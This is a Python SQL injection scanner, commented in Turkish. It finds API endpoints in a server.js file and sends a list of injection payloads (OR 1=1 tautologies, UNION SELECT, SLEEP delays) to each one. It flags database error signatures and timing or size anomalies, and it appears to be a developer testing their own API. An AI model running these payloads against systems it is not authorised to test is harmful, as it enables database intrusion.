#!/usr/bin/env python3
"""
Basit SQL Injection tarayıcı ve test aracı (parametresiz sürüm).

- Sunucu kaynak kodundan (server/server.js) tüm endpoint'leri otomatik keşfeder.
- API taban URL'i dosya içinde sabittir (BASE_URL) ve istenirse değiştirilebilir.
- Tüm HTTP metodları için deneme yapar (GET/POST/PUT/DELETE); path parametrelerine ve
  yoksa querystring'e payload enjekte eder.
"""

import time
import random
import string
import requests
from urllib.parse import urljoin
import re
import os


DEFAULT_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    '" OR "1"="1',
    "') OR ('1'='1",
    "admin' --",
    "admin') --",
    "1 OR 1=1",
    "1) OR (1=1",
    "' UNION SELECT 1,2,3 --",
    "' UNION SELECT NULL,NULL,NULL --",
    "' UNION SELECT SLEEP(2) --",
    '" UNION SELECT SLEEP(2) --',
    "'/**/OR/**/1=1-- -",
    "' ; SELECT 1; --",
]

# Hata imzaları
ERROR_SIGNATURES = [
    'You have an error in your SQL syntax',
    'Warning: mysql_',
    'unclosed quotation mark after the character string',
    'quoted string not properly terminated',
    'SQLSTATE[',
    'MySQL server version for the right syntax',
]


def jitter(base: float = 0.1) -> float:
    return base + random.random() * base


def generate_control_value() -> str:
    return 'ctrl_' + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(6))


def check_response_anomalies(resp: requests.Response, baseline_status: int) -> dict:
    issues = {}
    # 5xx artışı
    if 500 <= resp.status_code < 600 and baseline_status < 500:
        issues['http_5xx'] = True
    # Hata imzaları
    lower = (resp.text or '').lower()
    for sig in ERROR_SIGNATURES:
        if sig.lower() in lower:
            issues['db_error_signature'] = sig
            break
    return issues


def test_endpoint(session: requests.Session, base_url: str, method: str, endpoint: str, timeout: float) -> list:
    results = []
    control_value = generate_control_value()
    url_control = endpoint.replace('{p}', control_value)
    url_control_full = urljoin(base_url.rstrip('/') + '/', url_control.lstrip('/'))

    # Baseline (kontrol) isteği
    try:
        t0 = time.time()
        # Şimdilik keşif amaçlı sadece GET gönderiyoruz, method'u sonuçlara ekliyoruz
        r0 = session.get(url_control_full, timeout=timeout)
        base_duration = time.time() - t0
        baseline_status = r0.status_code
    except Exception as e:
        return [{
            'endpoint': endpoint,
            'payload': None,
            'error': f'Baseline request failed: {e}'
        }]

    def body_snippet(resp: requests.Response, limit: int = 400) -> str:
        try:
            ctype = (resp.headers.get('content-type') or '').lower()
            if 'application/json' in ctype:
                # JSON ise kısaltılmış metin döndür
                txt = resp.text
            else:
                txt = resp.text
            if txt is None:
                return ''
            txt = txt.strip().replace('\n', ' ')
            return (txt[:limit] + ('…' if len(txt) > limit else ''))
        except Exception:
            return ''

    for payload in DEFAULT_PAYLOADS:
        url_payload = endpoint.replace('{p}', requests.utils.quote(payload, safe=''))
        url_full = urljoin(base_url.rstrip('/') + '/', url_payload.lstrip('/'))
        try:
            t1 = time.time()
            r = session.get(url_full, timeout=timeout)
            dur = time.time() - t1
            issues = check_response_anomalies(r, baseline_status)

            # Time-based farkı (ör: SLEEP)
            if dur > max(base_duration * 3, timeout * 0.7):
                issues['suspicious_delay'] = round(dur, 3)

            # Boyut farkı (çok kabaca)
            if r.text and r0.text and abs(len(r.text) - len(r0.text)) > max(300, len(r0.text) * 0.5):
                issues['suspicious_size_diff'] = {'baseline': len(r0.text), 'current': len(r.text)}

            results.append({
                'endpoint': endpoint,
                'method': method,
                'tested_url': url_payload,
                'payload': payload,
                'status': r.status_code,
                'duration': round(dur, 3),
                'issues': issues,
                'body': body_snippet(r),
            })
            time.sleep(jitter(0.05))
        except Exception as e:
            results.append({
                'endpoint': endpoint,
                'method': method,
                'tested_url': url_payload,
                'payload': payload,
                'error': str(e),
            })
    return results


def discover_endpoints(server_js_path: str):
    if not os.path.exists(server_js_path):
        raise FileNotFoundError(f"Sunucu dosyası bulunamadı: {server_js_path}")
    with open(server_js_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()

    # app.<method>('...') yakala
    pattern = re.compile(r"app\.(get|post|put|delete)\s*\(\s*['\"]([^'\"]+)['\"]", re.IGNORECASE)
    matches = pattern.findall(content)

    # Sadece /api ile başlayanlar
    endpoints = []
    for method, path in matches:
        if not path.startswith('/api'):
            continue
        endpoints.append((method.upper(), path))
    return sorted(set(endpoints), key=lambda x: (x[0], x[1]))


def build_test_patterns(method: str, path: str):
    # Path parametrelerini {p} ile doldur
    path_with_payload = re.sub(r":[a-zA-Z_][a-zA-Z0-9_]*", "{p}", path)
    patterns = []
    # 1) Path içine payload
    patterns.append(path_with_payload)
    # 2) Querystring yoksa basit q paramı ekle
    if '?' not in path_with_payload:
        patterns.append(path_with_payload + "?q={p}")
    return list(dict.fromkeys(patterns))


def run_scan():
    # Buradan API base URL'ini ayarlayın
    BASE_URL = os.environ.get('API_BASE_URL', 'https://api.zerodaysoftware.tr')
    TIMEOUT = float(os.environ.get('SQLI_TIMEOUT', '8.0'))
    SERVER_JS = os.environ.get('SERVER_JS_PATH', r'C:\Users\Lenovo\Desktop\huglu_mobil2\server\server.js')

    endpoints = discover_endpoints(SERVER_JS)
    if not endpoints:
        print('Hiç endpoint bulunamadı.')
        return

    print(f"Bulunan endpoint sayısı: {len(endpoints)}")

    session = requests.Session()
    session.headers.update({'Accept': 'application/json', 'User-Agent': 'SQLi-Scanner/1.0', 'X-Tenant-Id': '1'})

    summary = []
    for method, path in endpoints:
        # Şimdilik tüm yöntemleri GET ile deneriz (keşif amaçlı). İleride POST/PUT için body eklenecek.
        for ep in build_test_patterns(method, path):
            res = test_endpoint(session, BASE_URL, method, ep, TIMEOUT)
            summary.extend(res)

    found = 0
    # Konsol çıktısını endpoint bazlı gruplu yaz
    from collections import defaultdict
    grouped = defaultdict(list)
    for it in summary:
        grouped[(it.get('method') or 'GET', it['endpoint'])].append(it)

    for (mtd, ep), items in grouped.items():
        print(f"\n== {mtd} {ep} ==")
        for item in items:
            if 'error' in item:
                print(f"[ERROR] payload={item.get('payload')} | url={item.get('tested_url')} | {item['error']}")
                continue
            has_issue = bool(item.get('issues'))
            status = 'ISSUE' if has_issue else 'ok'
            print(f"[{status}] payload={item['payload']} | url={item.get('tested_url')} | status={item.get('status')} | duration={item.get('duration')}s | issues={item.get('issues')}")
            body = item.get('body')
            if body:
                print(f"  body: {body}")
            if has_issue:
                found += 1

    print(f"\nToplam test: {len(summary)}, issue bulunan: {found}")

    # Raporu dosyaya yaz
    try:
      import datetime
      report_path = os.path.join('scripts', 'sqli_report.txt')
      # Klasör yoksa oluştur
      report_dir = os.path.dirname(report_path)
      if report_dir and not os.path.exists(report_dir):
        os.makedirs(report_dir, exist_ok=True)
      with open(report_path, 'w', encoding='utf-8') as rf:
        rf.write(f"SQLi Tarama Raporu\n")
        rf.write(f"Tarih: {datetime.datetime.utcnow().isoformat()}Z\n")
        rf.write(f"Base URL: {BASE_URL}\n")
        rf.write(f"Endpoint sayısı: {len(endpoints)}\n")
        rf.write(f"Toplam test: {len(summary)} | Issue: {found}\n")
        rf.write("\n--- Detaylar (Endpoint Bazlı) ---\n")
        for (mtd, ep), items in grouped.items():
          rf.write(f"\n## {mtd} {ep}\n")
          for item in items:
            if 'error' in item:
              rf.write(f"[ERROR] payload={item.get('payload')} | url={item.get('tested_url')} | {item['error']}\n")
              continue
            issues = item.get('issues') or {}
            status = 'ISSUE' if issues else 'ok'
            rf.write(f"[{status}] payload={item.get('payload')}\n")
            rf.write(f"  URL: {item.get('tested_url')}\n")
            rf.write(f"  Status: {item.get('status')} | Duration: {item.get('duration')}s\n")
            rf.write(f"  Issues: {issues}\n")
            body = item.get('body')
            if body:
              rf.write(f"  Body: {body}\n")
            rf.write("\n")
      print(f"Rapor yazıldı: {report_path}")
    except Exception as e:
      print(f"Rapor yazılırken hata: {e}")


if __name__ == '__main__':
    run_scan()


